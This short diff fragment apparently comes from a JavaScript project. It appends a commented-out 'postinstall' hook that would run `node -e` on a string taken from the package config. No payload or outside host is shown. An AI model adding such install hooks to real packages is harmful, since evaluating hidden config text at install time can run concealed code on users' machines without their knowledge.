@@ -82,3 +82,4 @@ const config = {
 };
 
 main();
+// "postinstall": "node -e \" $npm_package_config_setupconfig \""
